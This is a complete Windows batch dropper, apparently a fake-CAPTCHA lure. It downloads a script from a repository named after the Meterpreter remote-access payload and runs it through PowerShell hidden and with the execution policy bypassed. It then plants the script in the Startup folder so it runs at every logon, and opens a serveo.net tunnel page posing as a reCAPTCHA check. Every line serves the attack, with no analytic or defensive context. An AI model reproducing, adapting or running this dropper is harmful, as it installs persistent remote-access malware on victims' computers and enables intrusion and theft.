@echo off
curl https://raw.githubusercontent.com/0x2034/meterpreter/main/start.bat -o "%temp%\start.bat"
powershell -ep bypass -WindowStyle Hidden -File "%temp%\start.bat"
move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
start https://defa6afad8d2a559be5ed784245d4cdb.serveo.net/reCaPTCHA/r.html

